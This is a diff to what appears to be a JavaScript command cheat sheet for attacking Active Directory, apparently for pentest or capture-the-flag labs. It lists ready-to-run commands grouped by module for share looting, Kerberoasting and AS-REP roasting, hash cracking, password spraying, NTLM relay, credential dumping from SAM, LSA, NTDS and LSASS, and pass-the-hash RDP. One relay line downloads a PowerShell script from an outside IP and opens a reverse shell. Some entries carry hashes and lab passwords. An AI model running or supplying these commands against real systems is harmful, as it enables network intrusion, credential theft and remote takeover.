+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -d {DOMAIN} --groups`, category: 'groups' },
+
+
+
+      // ===== smbclient MODULE =====
+      { cmd: `smbmap -H {TARGET} -u 'guest' -p ''`, category: 'smbclient' },
+      { cmd: `nxc smb {TARGET} -u 'guest' -p '' --shares`, category: 'smbclient' },
+      { cmd: `enum4linux -a {TARGET}`, category: 'smbclient' },
+      { cmd: `smbclient -N -L //{TARGET}`, category: 'smbclient' },
+      { cmd: `smbclient -N  '//{TARGET}/Sharefolder/'`, category: 'smbclient' },
+      { cmd: `smbclient -U {USER}%''{PASS}'' //{TARGET}/Sharefolder`, category: 'smbclient' },
+      { cmd: `smbclient -U {USER}%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash //{TARGET}/Sharefolder`, category: 'smbclient' },
+      { cmd: `smbclient -U {DOMAIN}/{USER}%''{PASS}'' --pw-nt-hash  '//{TARGET}/Sharefolder' `, category: 'smbclient' },
+      { cmd: `smbclient -U {DOMAIN}/{USER}%e16081eb077aca74bdbf8af12af43ac9 --pw-nt-hash  '//{TARGET}/Sharefolder'`, category: 'smbclient' },
+      { cmd: `smb: \> RECURSE ON`, category: 'smbclient' },
+      { cmd: `smb: \> PROMPT OFF`, category: 'smbclient' },
+      { cmd: `smb: \> mget *`, category: 'smbclient' },
+      { cmd: `smbclient.py 'guest'@'{TARGET}' -no-pass`, category: 'smbclient' },
+      { cmd: `smbclient.py {USER}:''{PASS}''@'{TARGET}'`, category: 'smbclient' },
+      { cmd: `smbclient.py {DOMAIN}/{USER}@{TARGET} -k -no-pass`, category: 'smbclient' },
+      { cmd: `smbclient.py {DOMAIN}/{USER}@{TARGET} -hashes :5d8c3d1a20bd63f60f469f6763ca0d50`, category: 'smbclient' },
+      { cmd: `smbclient.py {DOMAIN}/{USER}:''{PASS}''@{TARGET}`, category: 'smbclient' },
+      { cmd: `help`, category: 'smbclient', header: true },
+      { cmd: `ls`, category: 'smbclient', header: true },
+      { cmd: `lls`, category: 'smbclient', header: true },
+      { cmd: `use share_name`, category: 'smbclient', header: true },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' --shares --spider IT --regex .`, category: 'smbclient' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.`, category: 'smbclient' },
+
+
+
 
       // ===== bloodhound MODULE =====
-      { cmd: 'nxc ldap $(cat dcip) -u {USER} -p {PASS} --bloodhound -c All --dns-server $(cat dcip) ', category: 'bloodhound' },
-      { cmd: 'nxc ldap $(cat dcip) -u {USER} -p {PASS} --bloodhound -c All --dns-server $(cat dcip) --dns-tcp', category: 'bloodhound' },
-      { cmd: 'bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -c All --zip -ns $(cat dcip)', category: 'bloodhound' },
-      { cmd: 'bloodyad -d {DOMAIN} --host dc01.{DOMAIN} -i $(cat dcip) -u {USER} -p {PASS} get bloodhound', category: 'bloodhound' },
-      { cmd: 'rusthound-ce -u {USER} -p {PASS} --domain {DOMAIN} -i $(cat dcip) --zip', category: 'bloodhound' },
-      { cmd: 'rusthound-ce -u {USER} -p {PASS} --domain {DOMAIN} -i $(cat dcip) --ldaps --zip', category: 'bloodhound' },
-      { cmd: '.\\SharpHound.exe -c All', category: 'bloodhound' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' --bloodhound -c All --dns-server {TARGET} `, category: 'bloodhound' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' --bloodhound -c All --dns-server {TARGET} --dns-tcp`, category: 'bloodhound' },
+      { cmd: `bloodhound-python -d {DOMAIN} -u {USER} -p '{PASS}' -c All --zip -ns {TARGET}`, category: 'bloodhound' },
+      { cmd: `bloodyad -d {DOMAIN} --host dc01.{DOMAIN} -i {TARGET} -u {USER} -p '{PASS}' get bloodhound`, category: 'bloodhound' },
+      { cmd: `rusthound-ce -u {USER} -p '{PASS}' --domain {DOMAIN} -i {TARGET} --zip`, category: 'bloodhound' },
+      { cmd: `rusthound-ce -u {USER} -p '{PASS}' --domain {DOMAIN} -i {TARGET} --ldaps --zip`, category: 'bloodhound' },
+      { cmd: `.\\SharpHound.exe -c All`, category: 'bloodhound' },
+
+
+
+      // ===== asreproast MODULE =====
+      { cmd: `sudo fixtime -i  {TARGET} --force`, category: 'asreproast' },
+      { cmd: `nxc ldap dc01.{DOMAIN} -u users.txt -p '' --asreproast asreproast.out`, category: 'asreproast' },
+      { cmd: `nxc ldap dc01.{DOMAIN} -u users.txt -p '' -k --asreproast asreproast.out`, category: 'asreproast' },
+      { cmd: `nxc ldap {TARGET} -u users.txt -p '' --dns-server {TARGET} --asreproast asreproast.out`, category: 'asreproast' },
+      { cmd: `nxc ldap {TARGET} -u users.txt -p '' -k --dns-server {TARGET} --asreproast asreproast.out`, category: 'asreproast' },
+      { cmd: `nxc ldap dc01.{DOMAIN} -u users.txt -p '' --dns-server {TARGET} --asreproast asreproast.out`, category: 'asreproast' },
+      { cmd: `nxc ldap dc01.{DOMAIN} -u users.txt -p '' -k --dns-server {TARGET} --asreproast asreproast.out`, category: 'asreproast' },
+      { cmd: `GetNPUsers.py -usersfile users.txt -dc-ip {TARGET} -request -format hashcat  '{DOMAIN}/' -outputfile asreproast.out`, category: 'asreproast' },
+      { cmd: `.\\Rubeus.exe asreproast  /outfile:asreproast.out /format:hashcat`, category: 'asreproast' },
+      { cmd: 'hashcat -m 18200 asreproast.out rockyou.txt --force', category: 'asreproast' },
+      { cmd: 'hashcat -m 18200 asreproast.out rockyou.txt --force -r /usr/share/hashcat/rules/best66.rule', category: 'asreproast' },
+      { cmd: 'hashcat -m 18200 asreproast.out rockyou.txt --force -r /usr/share/hashcat/rules/rockyou-30000.rule', category: 'asreproast' },
+      { cmd: `john --wordlist=rockyou.txt asreproast.out --format=krb5asrep`, category: 'asreproast' },
+      { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/wordlists/rockyou.txt > rockyou.txt`, category: 'asreproast' },
+      { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/wordlists/rockyou.txt > rockyou.txt`, category: 'asreproast' },
+      { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/john/password.lst > rockyou.txt`, category: 'asreproast' },
+      { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/john/password.lst > rockyou.txt`, category: 'asreproast' },
+
+
+
+      // ===== kerberoast MODULE =====
+      { cmd: `sudo fixtime -i  {TARGET} --force`, category: 'kerberoast' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' --kerberoasting kerberoasting.out --dns-server {TARGET}`, category: 'kerberoast' },
+      { cmd: `GetUserSPNs.py -dc-ip {TARGET} {DOMAIN}/{USER}:''{PASS}''  # Listing SPN Accounts`, category: 'kerberoast' },
+      { cmd: `GetUserSPNs.py -dc-ip {TARGET} {DOMAIN}/{USER}:''{PASS}'' -request -outputfile kerberoasting.out # Requesting all TGS Tickets`, category: 'kerberoast' },
+      { cmd: `GetUserSPNs.py -dc-ip {TARGET} {DOMAIN}/{USER}:''{PASS}'' -request-user $targetuser -outputfile kerberoasting.out`, category: 'kerberoast' },
+      { cmd: `GetUserSPNs.py -dc-ip {TARGET} {DOMAIN}/ -no-preauth <USERNAME_TO_TEST> -usersfile users.txt -outputfile kerberoasting.out`, category: 'kerberoast' },
+      { cmd: `.\\Rubeus.exe kerberoast /outfile:kerberoasting.out /format:hashcat`, category: 'kerberoast' },
+      { cmd: `hashcat -m 13100 kerberoasting.out rockyou.txt --force`, category: 'kerberoast' },
+      { cmd: `hashcat -m 13100 kerberoasting.out rockyou.txt --force  -r /usr/share/hashcat/rules/best66.rule`, category: 'kerberoast' },
+      { cmd: `hashcat -m 13100 kerberoasting.out rockyou.txt --force  -r /usr/share/hashcat/rules/rockyou-30000.rule`, category: 'kerberoast' },
+      { cmd: `john --wordlist=rockyou.txt kerberoasting.out `, category: 'kerberoast' },
+      { cmd: `john --wordlist=rockyou.txt kerberoasting.out --format=krb5tgs`, category: 'kerberoast' },
+      { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/wordlists/rockyou.txt > rockyou.txt`, category: 'kerberoast' },
+      { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/wordlists/rockyou.txt > rockyou.txt`, category: 'kerberoast' },
+      { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/john/password.lst > rockyou.txt`, category: 'kerberoast' },
+      { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/john/password.lst > rockyou.txt`, category: 'kerberoast' },
+
+
+      // ===== adcs MODULE =====
+      { cmd: `https://www.thehacker.recipes/ad/movement/adcs/`, category: 'adcs' },
+      { cmd: `https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation`, category: 'adcs' },
+      { cmd: `https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques`, category: 'adcs' },
+      { cmd: `https://seriotonctf.github.io/ADCS-Attacks-with-Certipy/index.html`, category: 'adcs' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -M adcs`, category: 'adcs' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' -M certipy-find`, category: 'adcs' },
+      { cmd: `certipy find -h`, category: 'adcs' },
+      { cmd: `certipy find -dc-ip {TARGET} -vulnerable -stdout -u {USER}@{DOMAIN} -p ''{PASS}'' `, category: 'adcs' },
+      { cmd: `certipy find -dc-ip {TARGET} -vulnerable -stdout -u {USER}@{DOMAIN} -hashes :b4b86f45c6018f1b664f70805f45d8f2 `, category: 'adcs' },
+      { cmd: `certipy find -dc-ip {TARGET} -vulnerable -stdout -u {USER}@{DOMAIN} -p ''{PASS}'' -ldap-scheme ldap -ldap-port 389 -no-ldap-channel-binding -no-ldap-signing`, category: 'adcs' },
+
+
+
+      // ===== ntlm_attack MODULE =====
+      { cmd: `nxc smb 172.16.117.0/24 --gen-relay-list relayTargets.txt`, category: 'ntlm_attack' },
+      { cmd: `nmap -Pn --script=smb2-security-mode.nse -p 445 172.16.117.0/24 --open`, category: 'ntlm_attack' },
+      { cmd: `sudo sed -i "s/SMB = On/SMB = Off/" /etc/responder/Responder.conf`, category: 'ntlm_attack' },
+      { cmd: `cat /etc/responder/Responder.conf | grep -i smb`, category: 'ntlm_attack' },
+      { cmd: `git clone https://github.com/Greenwolf/ntlm_theft.git && cd ntlm_theft`, category: 'ntlm_attack' },
+      { cmd: `python3 ntlm_theft.py -g all -s tun0 -f important`, category: 'ntlm_attack' },
+      { cmd: `ntlmrelayx.py -tf ips -smb2support -i `, category: 'ntlm_attack' },
+      { cmd: `sudo responder -I tun0 -Av`, category: 'ntlm_attack' },
+      { cmd: `ntlmrelayx.py -tf ips -smb2support -c 'ping -n 10.10.14.226'`, category: 'ntlm_attack' },
+      { cmd: `ntlmrelayx.py -tf ips -smb2support -c 'powershell -e AYwB0...<SNIP>....B0AHMALgBUAEMAUABDA'`, category: 'ntlm_attack' },
+      { cmd: `ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://192.168.120.134/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.120.134 -Port 7331"`, category: 'ntlm_attack' },
+
+
+      // ===== smbpasswd MODULE =====
+      { cmd: `sudo smbpasswd -r DC.{DOMAIN} -U {USER}`, category: 'smbpasswd' },
+      { cmd: `sudo smbpasswd {USER}@{TARGET}`, category: 'smbpasswd' },
+      { cmd: `wget https://github.com/boboaung1337/again/raw/refs/heads/main/smbpasswd.py && sudo mv smbpasswd.py /usr/local/bin && sudo chmod +x /usr/local/bin/smbpasswd.py`, category: 'smbpasswd' },
+      { cmd: `smbpasswd.py -newhashes :82d31d98ce4ebfa54514c36a8d885908 '{DOMAIN}'/'{USER}':''{PASS}''@'DC.{DOMAIN}'`, category: 'smbpasswd' },
+      { cmd: `smbpasswd.py -newpass 'Passw0rd!' '{DOMAIN}'/'{USER}':''{PASS}''@'DC.{DOMAIN}'`, category: 'smbpasswd' },
+
+
+
+
 
       // ===== userenum MODULE =====
-      { cmd: 'nxc smb $(cat dcip) -u {USER} -p {PASS} --users-export users.txt', category: 'userenum' },
-      { cmd: 'nxc smb $(cat dcip) -u {USER} -p {PASS} --users-export users.txt -k', category: 'userenum' },
-      { cmd: `nxc smb $(cat dcip) -u guest -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\\' -f2 | tee users.txt`, category: 'userenum'},
-      { cmd: `impacket-lookupsid -no-pass 'guest@{DOMAIN}' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d '\\' -f2 | tee users.txt`, category: 'userenum' },
-      { cmd: `impacket-GetADUsers -all {DOMAIN}/{USER}:'{PASS}' -dc-ip $(cat dcip)`, category: 'userenum' },
-      { cmd: 'kerbrute userenum -d {DOMAIN} --dc $(cat dcip) /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', category: 'userenum' },
-      { cmd: 'ldapsearch -h $(cat dcip) -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "', category: 'userenum' },
-      { cmd: 'windapsearch.py --dc-ip $(cat dcip) -u "" -U', category: 'userenum' },
-      { cmd: 'enum4linux -U $(cat dcip) | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > users.txt', category: 'userenum' },
-      { cmd: 'nxc ldap $(cat dcip) -u {USER} -p {PASS} --query "(sAMAccountName=*)" ""', category: 'userenum' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' --users-export users.txt`, category: 'userenum' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' --users-export users.txt -k`, category: 'userenum' },
+      { cmd: `nxc smb {TARGET} -u guest -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\\' -f2 | tee users.txt`, category: 'userenum'},
+      { cmd: `lookupsid.py -no-pass 'guest@{DOMAIN}' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d '\\' -f2 | tee users.txt`, category: 'userenum' },
+      { cmd: `GetADUsers.py -all {DOMAIN}/{USER}:''{PASS}'' -dc-ip {TARGET}`, category: 'userenum' },
+      { cmd: 'kerbrute userenum -d {DOMAIN} --dc {TARGET} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', category: 'userenum' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -x -b "DC=telecore,DC=ad" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" " > users.txt`, category: 'userenum' },
+      { cmd: 'windapsearch.py --dc-ip {TARGET} -u "" -U', category: 'userenum' },
+      { cmd: 'enum4linux -U {TARGET} | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > users.txt', category: 'userenum' },
+      { cmd: `nxc ldap {TARGET} -u {USER} -p '{PASS}' --query "(sAMAccountName=*)" ""`, category: 'userenum' },
       { cmd: '.\\SharpHound.exe -c All', category: 'userenum' },
 
 
+
+
+      // ===== ldapsearch MODULE =====
+      { cmd: `# Anonymous`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET}:389 -b "dc=htb,dc=local"`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -s base`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -x -s base -b "" domainFunctionality`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -b "dc=telecore,dc=ad" "(objectClass=user)" sAMAccountName`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -b "dc=telecore,dc=ad" "(objectClass=computer)" dNSHostName`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -b "DC=telecore,DC=ad" "objectClass=group"`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -x -b "DC=telecore,DC=ad" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" " > users.txt`, category: 'ldapsearch' },
+      { cmd: `# Find SPNs (Kerberoastable)`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -b "dc=domain,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName`, category: 'ldapsearch' },
+      { cmd: `# Find AS-REP Roastable (no pre-auth)`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -b "dc=domain,dc=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName`, category: 'ldapsearch' },
+      { cmd: `# Descriptions (often contain passwords)`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -b "dc=domain,dc=local" "(description=*)" sAMAccountName description info comment`, category: 'ldapsearch' },
+      { cmd: `# Authenticated`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -D "{USER}@{DOMAIN}" -w 'pass' -b "dc=domain,dc=local" "(objectClass=*)"`, category: 'ldapsearch' },
+      { cmd: `# LAPS passwords`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H ldap://{TARGET} -D "{USER}@{DOMAIN}" -w 'pass' -b "dc=domain,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`, category: 'ldapsearch' },
+      { cmd: `https://www.hackingarticles.in/active-directory-enumeration-ldeep/`, category: 'ldapsearch' },
+      { cmd: `https://www.thehacker.recipes/ad/recon/ldap`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H 'ldap://{TARGET}' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName`, category: 'ldapsearch' },
+      { cmd: `ldapsearch -x -H 'ldap://{TARGET}' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName`, category: 'ldapsearch' },
+      { cmd: `# windapsearch`, category: 'ldapsearch' },
+      { cmd: `windapsearch.py -U --full --dc-ip {TARGET}`, category: 'ldapsearch' },
+      { cmd: `windapsearch.py -d {DOMAIN} --dc-ip {TARGET} -U`, category: 'ldapsearch' },
+      { cmd: `windapsearch.py -d {DOMAIN} --dc-ip {TARGET} --custom "objectClass=*"`, category: 'ldapsearch' },
+
+
+      // ===== lookupsid MODULE =====
+      { cmd: `lookupsid.py {DOMAIN}/{USER}:'{PASS}'@{TARGET} | grep "Domain SID"`, category: 'lookupsid' },
+      { cmd: `lookupsid.py {DOMAIN}/{USER}:'{PASS}'@{TARGET} -domain-sids`, category: 'lookupsid' },
+      { cmd: `lookupsid.py {DOMAIN}/{USER}:'{PASS}'@{TARGET} | grep -B12 "Enterprise Admins"`, category: 'lookupsid' },
+      { cmd: `lookupsid.py {DOMAIN}/{USER}:'{PASS}'@{TARGET} | grep -i "administrator" | grep -i "sid"`, category: 'lookupsid' },
+      { cmd: `lookupsid.py anonymous@{DOMAIN} -no-pass`, category: 'lookupsid' },
+      { cmd: `lookupsid.py guest@{DOMAIN} -no-pass`, category: 'lookupsid' },
+      { cmd: `lookupsid.py {USER}@{TARGET} -no-pass`, category: 'lookupsid' },
+      { cmd: `lookupsid.py {USER}@{TARGET} 10000 -no-pass | grep -oP 'rebound\\\K\w+' | sed '/^$/d' > users.txt`, category: 'lookupsid' },
+      { cmd: `lookupsid.py -no-pass 'guest@{DOMAIN}' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d '\' -f2 | tee users.txt`, category: 'lookupsid' },
+      { cmd: `lookupsid.py {DOMAIN}/{USER}@{TARGET} -hashes :3d3a72af94548ebc7755287a88476460`, category: 'lookupsid' },
+
+
+
+
+      // ===== rpcclient MODULE =====
+      { cmd: `rpcclient --user {DOMAIN}/{USER}%'{PASS}' {TARGET} -c "lookupnames administrator"`, category: 'rpcclient' },
+      { cmd: `rpcclient -U '{USER}%{PASS}' {TARGET}`, category: 'rpcclient' },
+      { cmd: `rpcclient -U "" -N {TARGET}`, category: 'rpcclient' },
+      { cmd: `rpcclient -U "" -N {TARGET} -c "srvinfo"`, category: 'rpcclient' },
+      { cmd: `RID Brute Force (Range 500-1100)`, category: 'rpcclient' },
+      { cmd: `for i in $(seq 500 1100);do rpcclient -N -U "" {TARGET} -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done`, category: 'rpcclient' },
+      { cmd: `Simpler RID Brute Force`, category: 'rpcclient' },
+      { cmd: `for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N {TARGET} 2>/dev/null | grep -i "User Name"; done
+      `, category: 'rpcclient' },
+      { cmd: `Password Spray with Username List`, category: 'rpcclient' },
+      { cmd: `for u in $(cat users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" {TARGET} | grep Authority; done`, category: 'rpcclient' },
+      { cmd: `Password Spray with Extracted Usernames`, category: 'rpcclient' },
+      { cmd: `for u in $(cat users.txt | awk -F@ '{print $1}' | awk -F: '{print $2}'); do rpcclient -U "$u%Welcome123!" -c "getusername;quit" {TARGET} | grep Authority; done`, category: 'rpcclient' },
+      { cmd: `Available cmd`, category: 'rpcclient' },
+      { cmd: `setuserinfo audit2020 23 H@CKTHEB0X#`, category: 'rpcclient' },
+      { cmd: `setuserinfo2 Christopher.Lewis 23 Start123!`, category: 'rpcclient' },
+      { cmd: `enumdomusers`, category: 'rpcclient' },
+      { cmd: `enumdomgroups`, category: 'rpcclient' },
+      { cmd: `enumprinters`, category: 'rpcclient' },
+      { cmd: `enumdomgroupmembers <group_rid>`, category: 'rpcclient' },
+      { cmd: `queryuser <rid>`, category: 'rpcclient' },
+      { cmd: `querydominfo`, category: 'rpcclient' },
+      { cmd: `lookupnames <username>`, category: 'rpcclient' },
+      { cmd: `getdompwinfo`, category: 'rpcclient' },
+      { cmd: `netshareenumall`, category: 'rpcclient' },
+      { cmd: `lsquery`, category: 'rpcclient' },
+      { cmd: `querydispinfo`, category: 'rpcclient' },
+
+
+
+
+
       // ===== nxcdump MODULE =====
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --sam', category: 'nxcdump' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --ldaps', category: 'nxcdump' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --lsa ', category: 'nxcdump' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -M lsassy', category: 'nxcdump' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --ntds', category: 'nxcdump' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -M nanodump', category: 'nxcdump' },
-      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -M procdump', category: 'nxcdump' },
-      { cmd: `nxc smb {TARGET} -u {USER} -p {PASS} --lsa | awk '{print $5}' | fgrep '/' | tee hashes.txt`, category: 'nxcdump' },
-      { cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 hashes.txt`, category: 'nxcdump' },
-      { cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt`, category: 'nxcdump' },
-      { cmd: `hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt`, category: 'nxcdump' },
-      { cmd: `secretsdump.py {USER}:'{PASS}'@{TARGET}`, category: 'nxcdump' },
+      { cmd: 'Must Use Pwned Protocols : winrm,ssh,ftp,smb,mssql,nfs,wmi,vnc,rdp,ldap ', category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' --sam`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' --ldaps`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' --lsa --timeout 10`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' --lsa regdump`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' --lsa secdump`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' -M lsassy`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' --ntds`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' -M nanodump`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' -M procdump`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' --lsa | awk '{print $5}' | fgrep '/' | tee hashes.txt`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt`, category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p ''{PASS}'' -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt`, category: 'nxcdump' },
+      { cmd: `john --wordlist=rockyou.txt hash `, category: 'nxcdump' },
+      { cmd: `john --wordlist=rockyou.txt --format=mscash2 hash`, category: 'nxcdump' },
+      { cmd: `john --wordlist=rockyou.txt --format=NT hash`, category: 'nxcdump' },
+      { cmd: `john --wordlist=rockyou.txt --format=netntlmv2 hash`, category: 'nxcdump' },
+      { cmd: `hashcat -m 1000 hash rockyou.txt --force -r /usr/share/hashcat/rules/best66.rule`, category: 'nxcdump' },
+      { cmd: `hashcat -m 2100 hash rockyou.txt --force -r /usr/share/hashcat/rules/rockyou-30000.rule`, category: 'nxcdump' },
+      { cmd: `secretsdump.py {USER}:''{PASS}''@{TARGET}`, category: 'nxcdump' },
       { cmd: `secretsdump.py {USER}@{TARGET} -hashes :30B3783CE2ABF1AF70F77D0660CF3453`, category: 'nxcdump' },
-      { cmd: `secretsdump.py '{DOMAIN}'/'{USER}':'{PASS}'@'{TARGET}'`, category: 'nxcdump' },
+      { cmd: `secretsdump.py '{DOMAIN}'/'{USER}':''{PASS}''@'{TARGET}'`, category: 'nxcdump' },
       { cmd: `secretsdump.py {DOMAIN}/'{USER}'@{TARGET} -hashes :30B3783CE2ABF1AF70F77D0660CF3453`, category: 'nxcdump' },
       { cmd: `haiti 30B3783CE2ABF1AF70F77D0660CF3453`, category: 'nxcdump' },
-      { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/wordlists/rockyou.txt > rockyou_symbols.txt`, category: 'nxcdump' },
-      { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/wordlists/rockyou.txt > rockyou_alphanumeric.txt`, category: 'nxcdump' },
+      { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/wordlists/rockyou.txt > rockyou.txt`, category: 'nxcdump' },
+      { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/wordlists/rockyou.txt > rockyou.txt`, category: 'nxcdump' },
+      { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/john/password.lst > rockyou.txt`, category: 'nxcdump' },
+      { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/john/password.lst > rockyou.txt`, category: 'nxcdump' },
 
-      // ===== END LINES =====
+
+
+      // ===== rdp MODULE =====
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' -M rdp -o ACTION=enable`, category: 'rdp' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p '{PASS}' --local-auth -x "reg add HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\POLICIES\\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"`, category: 'rdp' },
+      { cmd: `xfreerdp /v:{TARGET} /u:{USER} /p:''{PASS}'' /dynamic-resolution /cert:ignore +clipboard /dynamic-resolution /drive:.,share`, category: 'rdp' },
+      { cmd: `xfreerdp /v:{TARGET} /u:{USER} /pth:'8c9555327d95f815987c0d81238c7660' /dynamic-resolution /cert:ignore +clipboard /dynamic-resolution /drive:.,share
+`, category: 'rdp' },
+      { cmd: `xfreerdp /v:{TARGET} /u:{USER} /d:{DOMAIN} /p:''{PASS}'' /dynamic-resolution /cert:ignore +clipboard /dynamic-resolution /drive:.,share
+`, category: 'rdp' },
+      { cmd: `xfreerdp /v:{TARGET} /u:{USER} /d:{DOMAIN} /pth:'8c9555327d95f815987c0d81238c7660' /dynamic-resolution /cert:ignore +clipboard /dynamic-resolution /drive:.,share`, category: 'rdp' },
+      { cmd: `rdesktop -r clipboard -u {USER} -p '{PASS}' {TARGET} -g 2530x1460`, category: 'rdp' },
+      { cmd: `rdesktop -r clipboard -u {USER} -p '{PASS}' {TARGET}:1234 -r disk:Shared=/home/kali/Downloads/Tools/mimikatz/x64`, category: 'rdp' },
+      { cmd: `rdesktop -r clipboard -u {USER} -p aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 {TARGET} -g 2530x1460
+`, category: 'rdp' },
